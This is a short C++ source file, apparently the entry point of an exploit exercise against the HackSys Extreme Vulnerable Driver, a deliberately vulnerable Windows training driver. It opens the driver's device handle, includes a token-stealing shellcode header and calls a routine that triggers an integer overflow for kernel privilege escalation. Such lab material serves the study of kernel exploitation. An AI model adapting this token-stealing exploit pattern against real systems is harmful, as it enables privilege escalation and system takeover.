#include <Windows.h>
#include <stdio.h>
#include "ioctal_codes.h"
#include "TokenStealingShellcode.h"
#include "Solutions.h"

int main()
{
	LPCWSTR lpFileName = L"\\\\.\\HacksysExtremeVulnerableDriver";

	HANDLE hDeviceHandle = CreateFile(lpFileName,
		GENERIC_WRITE | GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hDeviceHandle == INVALID_HANDLE_VALUE) {
		printf("[-] ERROR: invalid handle\n");
		system("pause");
		return 1;
	}

	Solutions* solutions = new Solutions(hDeviceHandle);
	DWORD res = solutions->TriggerIntegerOverflow();

	return res;
}